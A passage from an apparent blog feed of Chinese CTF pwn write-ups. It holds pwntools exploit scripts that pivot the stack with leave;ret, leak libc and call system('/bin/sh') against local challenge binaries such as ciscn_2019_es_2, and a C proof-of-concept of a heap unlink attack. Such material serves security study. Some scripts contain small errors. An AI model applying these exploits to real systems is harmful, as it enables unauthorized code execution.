class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x08048408</span></span><br><span class="line">pop1_ret = <span class="number">0x080485ab</span></span><br><span class="line">pop3_ret = <span class="number">0x080485a9</span></span><br><span class="line">buf = elf.bss()+<span class="number">0x500</span></span><br><span class="line">buf2 = elf.bss()+<span class="number">0x400</span></span><br><span class="line">read_plt = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">shellcode = <span class="number">0x0804A300</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">payload = p32(<span class="number">0x0804A380</span>) </span><br><span class="line">payload += p32(elf.plt[<span class="string">'write'</span>]) </span><br><span class="line">payload += p32(leave_ret) </span><br><span class="line">payload += p32(<span class="number">1</span>) </span><br><span class="line">payload += p32(elf.got[<span class="string">'write'</span>])</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">'a'</span>*(<span class="number">0x80</span> - <span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0x0804A400</span>)</span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(leave_ret) </span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0x0804A400</span>)</span><br><span class="line">payload += p32(<span class="number">20</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p32(shellcode) + p32(leave_ret)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">write_addr= u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">"write :"</span>+hex(write_addr))</span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line">log.success(<span class="string">"libc_base :"</span>+hex(libc_base))</span><br><span class="line">log.success(<span class="string">"system :"</span>+hex(system_addr))</span><br><span class="line">log.success(<span class="string">"binsh :"</span>+hex(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0xdeadbeef</span>) + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h3><p>emmmmm，认真记录一次栈迁移，做了这题，发现对于栈迁移技术了解的还是不够透彻，故此详细记录两种打法。</p><p>先提出一点，不知道为什么，leak的ebp地址和调试过程中在栈空间覆盖ebp的地址差了0x10，也就是leak_ebp_addr - 0x10 = 栈空间ebp_addr</p><h4 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh =process(<span class="string">'./ciscn_2019_es_2'</span>)</span><br><span class="line"></span><br><span class="line">sys_plt=<span class="number">0x8048400</span> </span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x20</span> + <span class="string">'b'</span>*<span class="number">0x08</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line">ebp = u32(sh.recv(<span class="number">4</span>)) //这里因为发现memset函数只清理了栈空间<span class="number">0x20</span>的空间，观察到ebp还在！</span><br><span class="line"><span class="keyword">print</span> (hex(ebp))</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">payload = (<span class="string">'a'</span>*<span class="number">8</span>+p32(ebp<span class="number">-0x24</span>)+<span class="string">'bbbb'</span>+p32(sys_plt)+<span class="string">'cccc'</span> + p32(ebp<span class="number">-0x1c</span>)+<span class="string">'/bin/sh\x00'</span>).ljust(<span class="number">0x28</span>,<span class="string">'p'</span>)+p32(ebp<span class="number">-0x2c</span>)</span><br><span class="line">//此处将ebp覆盖为ebp<span class="number">-0x2c</span>（pwndbg调试的），将栈移动到了bbbb前面，此时的ebp就是bbbb，那么ret就是sys_plt。然后参数就是p32(ebp<span class="number">-0x1c</span>)指向的字符串，即/bin/sh。（至于为什么不直接在<span class="string">'cccc'</span>的后面直接写入<span class="string">'/bin/sh\x00'</span>，我想了想，这是<span class="number">32</span>位，嗨，<span class="number">4</span>字节的参数，<span class="number">8</span>字节的binsh不行，转为指针就没问题了。</span><br><span class="line">sh.send(payload)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ciscn_2019_es_2'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ciscn_2019_es_2'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x20</span> + <span class="string">'b'</span>*<span class="number">0x08</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line">ebp = u32(sh.recv(<span class="number">4</span>)) //leak思路一样</span><br><span class="line">print(hex(ebp))</span><br><span class="line"></span><br><span class="line">addr = ebp<span class="number">-0x38</span> //这里就直接按我们gdb里所调试到的，真实偏移为<span class="number">0x38</span>，直接到变量输入处。</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">4</span>+p32(elf.plt[<span class="string">'system'</span>])+<span class="string">'aaaa'</span>+p32(addr+<span class="number">0x10</span>)</span><br><span class="line">payload+= <span class="string">'/bin/sh\x00'</span>+<span class="string">'a'</span>*<span class="number">0x10</span>+p32(addr)+p32(<span class="number">0x80485fd</span>)</span><br><span class="line">//那么此处就是<span class="string">'aaaa'</span>为ebp，ret还是<span class="string">'system'</span>。</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;migration&quot;&gt;&lt;a href=&quot;#migration&quot; class=&quot;headerlink&quot; title=&quot;migration&quot;&gt;&lt;/a&gt;migration&lt;/h3&gt;&lt;p&gt;栈迁移其实就是利用 leave ret&lt;br&gt;因为 leave ret 实际上就是 
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>pwn unlink</title>
    <link href="http://yoursite.com/2019/10/18/pwn%20%20unlink/"/>
    <id>http://yoursite.com/2019/10/18/pwn%20%20unlink/</id>
    <published>2019-10-18T04:23:44.449Z</published>
    <updated>2019-10-06T06:27:40.233Z</updated>
    
    <content type="html"><![CDATA[<p>一个实验的poc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * target = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">init();</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr1 = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr2 = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr3 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">target = ptr1;</span><br><span class="line">ptr1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">ptr1[<span class="number">1</span>] = <span class="number">0x81</span>;</span><br><span class="line">ptr1[<span class="number">2</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;target) - <span class="number">0x18</span>;</span><br><span class="line">ptr1[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;target) - <span class="number">0x10</span>;</span><br><span class="line">ptr2[<span class="number">-2</span>] = <span class="number">0x80</span>;</span><br><span class="line">ptr2[<span class="number">-1</span>] = <span class="number">0x90</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"target = %p before free\n"</span>,target);</span><br><span class="line"><span class="built_in">free</span>(ptr2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"target = %p after free\n"</span>,target);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"pid = %d\n"</span>,getpid());</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一个实验的poc&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
